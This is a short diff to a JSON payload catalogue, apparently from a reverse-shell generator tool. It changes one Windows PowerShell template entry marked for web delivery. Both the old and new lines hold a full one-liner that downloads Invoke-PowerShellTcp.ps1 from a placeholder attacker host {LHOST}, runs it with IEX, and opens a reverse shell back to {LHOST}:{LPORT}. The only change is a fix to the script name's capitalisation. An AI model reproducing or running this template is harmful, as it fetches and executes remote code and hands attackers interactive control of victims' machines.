@@ -93,7 +93,7 @@
 		"subtype": "powershell",
 		"format": "one-liner",
 		"os": "windows",
-		"template": "powershell -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/Invoke-powershellTcp.ps1'); Invoke-powershellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}\"",
+		"template": "powershell -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/Invoke-PowerShellTcp.ps1'); Invoke-powershellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}\"",
 		"web-delivery": true
 	},
 	{
